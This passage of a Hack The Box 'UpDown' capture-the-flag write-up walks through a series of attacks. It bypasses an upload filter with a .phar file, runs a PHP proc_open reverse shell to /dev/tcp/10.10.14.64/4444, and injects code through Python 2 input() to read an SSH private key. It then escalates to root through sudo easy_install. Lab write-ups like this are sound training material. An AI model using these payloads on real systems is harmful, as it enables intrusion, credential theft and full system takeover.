+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/7.png"
+            data-srcset="/hackthebox-updown/7.png, /hackthebox-updown/7.png 1.5x, /hackthebox-updown/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/7.png" width="1321" height="112" />
+    </a><figcaption class="image-caption">File upload filtering</figcaption>
+    </figure></p>
+<p>The above code is checking for multiple extensions and if any of them match then it shows <code>Extension not allowed!</code>.</p>
+<p>Notice we have multiple older php extensions as well. Out of which <code>phar</code> extension is not present in the above check.</p>
+<p>Let&rsquo;s try uploading a <code>.phar</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/8.png" title="Successfully Uploaded" data-thumbnail="/hackthebox-updown/8.png" data-sub-html="<h2>Successfully Uploaded</h2><p>Successfully Uploaded</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/8.png"
+            data-srcset="/hackthebox-updown/8.png, /hackthebox-updown/8.png 1.5x, /hackthebox-updown/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/8.png" width="1366" height="585" />
+    </a><figcaption class="image-caption">Successfully Uploaded</figcaption>
+    </figure></p>
+<p>And the file got uploaded successfully.</p>
+<h2 id="foothold">Foothold</h2>
+<p>Now what we need is to upload a reverse shell in <code>.phar</code> file, then find the path of the file and then execute it to get the reverse shell.</p>
+<p>Looking further in the source code of <code>checker.php</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/9.png" title="Uploaded file directory" data-thumbnail="/hackthebox-updown/9.png" data-sub-html="<h2>Uploaded file directory</h2><p>Uploaded file directory</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/9.png"
+            data-srcset="/hackthebox-updown/9.png, /hackthebox-updown/9.png 1.5x, /hackthebox-updown/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/9.png" width="1343" height="177" />
+    </a><figcaption class="image-caption">Uploaded file directory</figcaption>
+    </figure></p>
+<p>There&rsquo;s an <code>uploads</code> directory where it adds another directory with the name of <code>md5</code> sum of the current timestamp.</p>
+<p>So if we upload a <code>shell.phar</code> file then the uploaded file will be at <code>http://dev.siteisup.htb/uploads/md5_sum_of_current_time/shell.phar</code>.</p>
+<p>We can have a look at <code>http://dev.siteisup.htb/uploads</code> directly right after uploading our file. But the file gets deleted as soon as it is read by the program.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/19.png" title="File Deletion" data-thumbnail="/hackthebox-updown/19.png" data-sub-html="<h2>File Deletion</h2><p>File Deletion</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/19.png"
+            data-srcset="/hackthebox-updown/19.png, /hackthebox-updown/19.png 1.5x, /hackthebox-updown/19.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/19.png" width="1339" height="446" />
+    </a><figcaption class="image-caption">File Deletion</figcaption>
+    </figure></p>
+<p>What we can do is create a longer file with a bunch of urls to check and put our reverse shell code right after. This will hopefully give us enough time to execute the file.</p>
+<p>Also notice that a bunch of php functions are disabled when we execute our reverse shell so the only shell that worked was with the <code>proc_open</code> function.</p>
+<p>I wrote the shell modifying an example on <code>proc_open</code> <a href="https://www.php.net/manual/en/function.proc-open.php" target="_blank" rel="noopener noreffer ">manual</a> page.</p>
+<p><code>shell.phar</code> file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://test.com
+</span></span><span class="line"><span class="cl">http://test.com
+</span></span><span class="line"><span class="cl">http://test.com
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl"><span class="nv">$descriptorspec</span> <span class="o">=</span> array<span class="o">(</span>
+</span></span><span class="line"><span class="cl">   <span class="nv">0</span> <span class="o">=</span>&gt; array<span class="o">(</span><span class="s2">&#34;pipe&#34;</span>, <span class="s2">&#34;r&#34;</span><span class="o">)</span>,  // stdin is a pipe that the child will <span class="nb">read</span> from
+</span></span><span class="line"><span class="cl">   <span class="nv">1</span> <span class="o">=</span>&gt; array<span class="o">(</span><span class="s2">&#34;pipe&#34;</span>, <span class="s2">&#34;w&#34;</span><span class="o">)</span>,  // stdout is a pipe that the child will write to
+</span></span><span class="line"><span class="cl">   <span class="nv">2</span> <span class="o">=</span>&gt; array<span class="o">(</span><span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;/tmp/error-output.txt&#34;</span>, <span class="s2">&#34;a&#34;</span><span class="o">)</span> // stderr is a file to write to
+</span></span><span class="line"><span class="cl"><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$cwd</span> <span class="o">=</span> <span class="s1">&#39;/tmp&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$env</span> <span class="o">=</span> array<span class="o">(</span><span class="s1">&#39;some_option&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;aeiou&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$process</span> <span class="o">=</span> proc_open<span class="o">(</span><span class="s1">&#39;bash&#39;</span>, <span class="nv">$descriptorspec</span>, <span class="nv">$pipes</span>, <span class="nv">$cwd</span>, <span class="nv">$env</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span>is_resource<span class="o">(</span><span class="nv">$process</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    // <span class="nv">$pipes</span> now looks like this:
+</span></span><span class="line"><span class="cl">    // <span class="nv">0</span> <span class="o">=</span>&gt; writeable handle connected to child stdin
+</span></span><span class="line"><span class="cl">    // <span class="nv">1</span> <span class="o">=</span>&gt; readable handle connected to child stdout
+</span></span><span class="line"><span class="cl">    // Any error output will be appended to /tmp/error-output.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    fwrite<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>0<span class="o">]</span>, <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.64/4444 0&gt;&amp;1&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    fclose<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>0<span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> stream_get_contents<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1<span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    fclose<span class="o">(</span><span class="nv">$pipes</span><span class="o">[</span>1<span class="o">])</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // It is important that you close any pipes before calling
+</span></span><span class="line"><span class="cl">    // proc_close in order to avoid a deadlock
+</span></span><span class="line"><span class="cl">    <span class="nv">$return_value</span> <span class="o">=</span> proc_close<span class="o">(</span><span class="nv">$process</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="s2">&#34;command returned </span><span class="nv">$return_value</span><span class="s2">\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Executing the shell we get the connection back in our machine.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/10.png" title="Shell as www-data" data-thumbnail="/hackthebox-updown/10.png" data-sub-html="<h2>Shell as www-data</h2><p>Shell as www-data</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/10.png"
+            data-srcset="/hackthebox-updown/10.png, /hackthebox-updown/10.png 1.5x, /hackthebox-updown/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/10.png" width="1340" height="172" />
+    </a><figcaption class="image-caption">Shell as www-data</figcaption>
+    </figure></p>
+<h2 id="www-data---developer">www-data -&gt; developer</h2>
+<p>Looking for interesting files, we have two files in the <code>/home/developer/dev/</code> directory.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/11.png" title="/home/developer/dev/" data-thumbnail="/hackthebox-updown/11.png" data-sub-html="<h2>/home/developer/dev/</h2><p>/home/developer/dev/</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/11.png"
+            data-srcset="/hackthebox-updown/11.png, /hackthebox-updown/11.png 1.5x, /hackthebox-updown/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/11.png" width="1325" height="126" />
+    </a><figcaption class="image-caption">/home/developer/dev/</figcaption>
+    </figure></p>
+<p>One of the files is an <code>elf</code> binary while the other is a python file.</p>
+<p><code>siteisup</code> binary.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/12.png" title="siteisup binary" data-thumbnail="/hackthebox-updown/12.png" data-sub-html="<h2>siteisup binary</h2><p>siteisup binary</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/12.png"
+            data-srcset="/hackthebox-updown/12.png, /hackthebox-updown/12.png 1.5x, /hackthebox-updown/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/12.png" width="1346" height="74" />
+    </a><figcaption class="image-caption">siteisup binary</figcaption>
+    </figure></p>
+<p>Executing and looking at the strings of the binary, we can conclude that this is calling out the other file <code>siteisup_test.py</code> file.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/13.png" title="strings siteisup" data-thumbnail="/hackthebox-updown/13.png" data-sub-html="<h2>strings siteisup</h2><p>strings siteisup</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/13.png"
+            data-srcset="/hackthebox-updown/13.png, /hackthebox-updown/13.png 1.5x, /hackthebox-updown/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/13.png" width="1339" height="448" />
+    </a><figcaption class="image-caption">strings siteisup</figcaption>
+    </figure></p>
+<p>So what exactly the file <code>siteisup_test.py</code> does? Well it also provides similar functionality and checks whether the provided site is up or not.</p>
+<p>Contents of <code>siteisup_test.py</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter URL here:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">page</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">page</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span> <span class="s2">&#34;Website is up&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span> <span class="s2">&#34;Website is down&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Running the binary, when we provide <code>http://siteisup.htb</code> in input it should&rsquo;ve return <code>Website is up</code> or <code>Website is down</code>. But instead it throws out an error.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/14.png" title="Running the binary" data-thumbnail="/hackthebox-updown/14.png" data-sub-html="<h2>Running the binary</h2><p>Running the binary</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/14.png"
+            data-srcset="/hackthebox-updown/14.png, /hackthebox-updown/14.png 1.5x, /hackthebox-updown/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/14.png" width="1343" height="252" />
+    </a><figcaption class="image-caption">Running the binary</figcaption>
+    </figure></p>
+<p>Now if we provide the same input but in string format as <code>&quot;http://siteisup.htb&quot;</code> it returns the correct output.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/15.png" title="Correct output" data-thumbnail="/hackthebox-updown/15.png" data-sub-html="<h2>Correct output</h2><p>Correct output</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/15.png"
+            data-srcset="/hackthebox-updown/15.png, /hackthebox-updown/15.png 1.5x, /hackthebox-updown/15.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/15.png" width="1346" height="146" />
+    </a><figcaption class="image-caption">Correct output</figcaption>
+    </figure></p>
+<p>Wait but what difference did that make?</p>
+<p>By default the <code>/usr/bin/python</code> is running <code>python2</code> so the file <code>siteisup_test.py</code> is also being run in <code>python2</code>.</p>
+<p>Looking at <a href="https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/" target="_blank" rel="noopener noreffer ">this</a> article, we can see that the <code>input()</code> function of <code>python2</code> is vulnerable.</p>
+<p>If we just use plain <code>input()</code> in <code>python2</code>, instead of saving it in the variable as string, it takes it as an expression and runs our provided input.</p>
+<p>We can take advantage of this behavior and try running system commands through this.</p>
+<p>By reading <a href="https://stackoverflow.com/a/44205566" target="_blank" rel="noopener noreffer ">this</a> stackoverflow answer, I made an expression to run code through the binary.</p>
+<p>By provide the input <code>__import__('os').system('id')</code>, we can see the output of the command.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/16.png" title="Injected Command" data-thumbnail="/hackthebox-updown/16.png" data-sub-html="<h2>Injected command</h2><p>Injected Command</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/16.png"
+            data-srcset="/hackthebox-updown/16.png, /hackthebox-updown/16.png 1.5x, /hackthebox-updown/16.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/16.png" width="1344" height="432" />
+    </a><figcaption class="image-caption">Injected command</figcaption>
+    </figure></p>
+<p>Nice! we can run commands as <code>developer</code>.</p>
+<p>Now simply read the <code>ssh</code> private key and log in as <code>developer</code>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-updown/17.png" title="Reading the ssh key" data-thumbnail="/hackthebox-updown/17.png" data-sub-html="<h2>Reading the ssh key</h2><p>Reading the ssh key</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-updown/17.png"
+            data-srcset="/hackthebox-updown/17.png, /hackthebox-updown/17.png 1.5x, /hackthebox-updown/17.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-updown/17.png" width="1343" height="448" />
+    </a><figcaption class="image-caption">Reading the ssh key</figcaption>
+    </figure></p>
+<p>And we&rsquo;re in!</p>
+<h2 id="usertxt">user.txt</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(saad👻ssaadakhtarr)-[~/Desktop/hackthebox/machines/updown]
+</span></span><span class="line"><span class="cl">└─$ ssh -i id_rsa developer@siteisup.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">developer@updown:~$ whoami
+</span></span><span class="line"><span class="cl">developer
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">developer@updown:~$ cat user.txt
+</span></span><span class="line"><span class="cl">b0****************************af
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Checking what we can run as <code>sudo</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">developer@updown:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for developer on localhost:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User developer may run the following commands on localhost:
+</span></span><span class="line"><span class="cl">    (ALL) NOPASSWD: /usr/local/bin/easy_install
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can run <code>easy_install</code> as root without password.</p>
+<p>Simply checking and running the <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo" target="_blank" rel="noopener noreffer ">gtfobins</a> exploit of this binary we can escalate as root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">developer@updown:~$ TF=$(mktemp -d)
+</span></span><span class="line"><span class="cl">developer@updown:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
+</span></span><span class="line"><span class="cl">developer@updown:~$ sudo easy_install $TF
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">WARNING: The easy_install command is deprecated and will be removed in a future version.
+</span></span><span class="line"><span class="cl">Processing tmp.Co2hiEXh3z
+</span></span><span class="line"><span class="cl">Writing /tmp/tmp.Co2hiEXh3z/setup.cfg
+</span></span><span class="line"><span class="cl">Running setup.py -q bdist_egg --dist-dir /tmp/tmp.Co2hiEXh3z/egg-dist-tmp-nK7eay
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="roottxt">root.txt</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@updown:/tmp/tmp.Co2hiEXh3z# cd /root
+</span></span><span class="line"><span class="cl">root@updown:~# cat root.txt
+</span></span><span class="line"><span class="cl">31****************************af
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-01-21</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-updown/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-updown/" data-title="Hackthebox - UpDown" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-updown/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-updown/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hackthebox-shoppy/" class="prev" rel="prev" title="Hackthebox - Shoppy"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Hackthebox - Shoppy</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
